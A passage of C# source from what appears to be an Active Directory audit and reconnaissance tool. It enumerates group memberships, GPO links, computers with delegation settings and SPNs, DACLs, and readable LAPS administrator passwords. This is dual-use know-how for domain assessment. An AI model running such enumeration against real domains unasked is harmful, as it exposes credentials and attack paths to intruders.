                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    LDAPClass.AdGroupDictionary.Add((Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))),(Convert.ToString(AdGroup.Properties["samaccountname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    SearchResult AdGroup = (SearchResult) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = AdGroup.Properties["samaccounttype"].Count != 0 ? Convert.ToString(AdGroup.Properties["samaccounttype"][0]) : "";
                    string ObjectClass = Convert.ToString(AdGroup.Properties["objectclass"][AdGroup.Properties["objectclass"].Count-1]);
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";
                    string PrimaryGroupID = "";
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == "foreignSecurityPrincipal")
                    {
                        AccountType = "foreignSecurityPrincipal";
                        MemberName = null;
                        MemberUserName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }

                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );

                        foreach (string GroupMember in AdGroup.Properties["memberof"])
                        {
                            GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                            GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        AccountType = "trust";
                        MemberName = ((Convert.ToString(AdGroup.Properties["DistinguishedName"][0])).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Properties["sAMAccountName"][0]);
                        PrimaryGroupID = Convert.ToString(AdGroup.Properties["primaryGroupID"][0]);
                        try
                        {
                            GroupName = LDAPClass.AdGroupDictionary[LDAPClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("Exception caught: {0}", e);
                            GroupName = PrimaryGroupID;
                        }

                        GroupMemberObj = new PSObject();
                        GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                        GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                        GroupsList.Add( GroupMemberObj );
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdOU = (SearchResult) record;

                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Properties["name"][0]));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", (AdOU.Properties["description"].Count != 0 ? AdOU.Properties["description"][0] : "")));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Properties["whencreated"][0]));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Properties["whenchanged"][0]));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Properties["distinguishedname"][0]));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Properties["displayname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Properties["name"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Properties["whenCreated"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Properties["whenChanged"][0]));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Properties["distinguishedname"][0])));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Properties["gpcfilesyspath"][0]));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGPO = (SearchResult) record;
                    LDAPClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Properties["distinguishedname"][0]).ToUpper()), (Convert.ToString(AdGPO.Properties["displayname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSOM = (SearchResult) record;

                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    string gPLink = (AdSOM.Properties["gPLink"].Count != 0 ? Convert.ToString(AdSOM.Properties["gPLink"][0]) : "");
                    string GPOName = null;

                    Depth = ((Convert.ToString(AdSOM.Properties["distinguishedname"][0]).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1);
                    if (AdSOM.Properties["gPOptions"].Count != 0)
                    {
                        if ((int) AdSOM.Properties["gPOptions"][0] == 1)
                        {
                            BlockInheritance = true;
                        }
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (string link in GPLinks)
                    {
                        string[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = LDAPClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? LDAPClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Properties["name"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Properties["distinguishedname"][0]));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", (AdSOM.Properties["gpoptions"].Count != 0 ? AdSOM.Properties["gpoptions"][0] : "")));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdPrinter = (SearchResult) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Properties["Name"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Properties["serverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", AdPrinter.Properties["printShareName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Properties["driverName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Properties["driverVersion"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", AdPrinter.Properties["portName"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", AdPrinter.Properties["url"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Properties["whenCreated"][0]));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Properties["whenChanged"][0]));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool Dormant = false;
                    bool? Enabled = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    string StrIPAddress = null;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Properties["dnshostname"].Count != 0)
                    {
                        try
                        {
                            StrIPAddress = Convert.ToString(Dns.GetHostEntry(Convert.ToString(AdComputer.Properties["dnshostname"][0])).AddressList[0]);
                        }
                        catch
                        {
                            StrIPAddress = null;
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdComputer.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdComputer.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                    }
                    if (AdComputer.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Properties["pwdlastset"].Count != 0)
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Properties["pwdlastset"][0]));
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) TrustedforDelegation) && ((int) AdComputer.Properties["primarygroupid"][0] == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                    {
                        DelegationType = "Constrained";
                        for (int i = 0; i < AdComputer.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                        {
                            var delegateto = AdComputer.Properties["msDS-AllowedToDelegateTo"][i];
                            DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                        }
                        DelegationServices = DelegationServices.TrimStart(',');
                    }
                    if ((bool) TrustedtoAuthforDelegation)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    string SIDHistory = "";
                    if (AdComputer.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdComputer.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdComputer.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    string OperatingSystem = CleanString((AdComputer.Properties["operatingsystem"].Count != 0 ? AdComputer.Properties["operatingsystem"][0] : "-") + " " + (AdComputer.Properties["operatingsystemhotfix"].Count != 0 ? AdComputer.Properties["operatingsystemhotfix"][0] : " ") + " " + (AdComputer.Properties["operatingsystemservicepack"].Count != 0 ? AdComputer.Properties["operatingsystemservicepack"][0] : " ") + " " + (AdComputer.Properties["operatingsystemversion"].Count != 0 ? AdComputer.Properties["operatingsystemversion"][0] : " "));

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", (AdComputer.Properties["samaccountname"].Count != 0 ? CleanString(AdComputer.Properties["samaccountname"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Name", (AdComputer.Properties["name"].Count != 0 ? CleanString(AdComputer.Properties["name"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", StrIPAddress));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", (AdComputer.Properties["primarygroupid"].Count != 0 ? AdComputer.Properties["primarygroupid"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["objectSID"][0], 0))));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", (AdComputer.Properties["Description"].Count != 0 ? CleanString(AdComputer.Properties["Description"][0]) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", (AdComputer.Properties["ms-ds-CreatorSid"].Count != 0 ? Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties["ms-ds-CreatorSid"][0], 0)) : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdComputer.Properties["useraccountcontrol"].Count != 0 ? AdComputer.Properties["useraccountcontrol"][0] : "")));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Properties["whencreated"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Properties["whenchanged"][0]));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Properties["distinguishedname"][0]));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    if (AdComputer.Properties["serviceprincipalname"].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in AdComputer.Properties["serviceprincipalname"])
                    {
                        string[] SPNArray = SPN.Split('/');
                        bool flag = true;
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members["Service"].Value == SPNArray[0] )
                            {
                                Obj.Members["Host"].Value = string.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty("UserName", (AdComputer.Properties["samaccountname"].Count != 0 ? CleanString(AdComputer.Properties["samaccountname"][0]) : "")));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Name", (AdComputer.Properties["name"].Count != 0 ? CleanString(AdComputer.Properties["name"][0]) : "")));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count != 0)
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Properties["ms-mcs-admpwdexpirationtime"][0]));
                        PasswordStored = true;
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Properties["dnshostname"].Count != 0 ? AdComputer.Properties["dnshostname"][0] : AdComputer.Properties["cn"][0] )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", (AdComputer.Properties["ms-mcs-admpwd"].Count != 0 ? AdComputer.Properties["ms-mcs-admpwd"][0] : null)));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            LDAPClass.AdSIDDictionary.Add(Convert.ToString(new SecurityIdentifier((byte[])AdObject.Properties["objectSID"][0], 0)), (Convert.ToString(AdObject.Properties["name"][0])));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", LDAPClass.AdSIDDictionary.ContainsKey(Owner) ? LDAPClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Properties["distinguishedname"][0]));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties["name"][0]);

                    switch (Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Properties["displayname"][0]);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties["objectclass"][AdObject.Properties["objectclass"].Count-1]);
                            break;
                    }
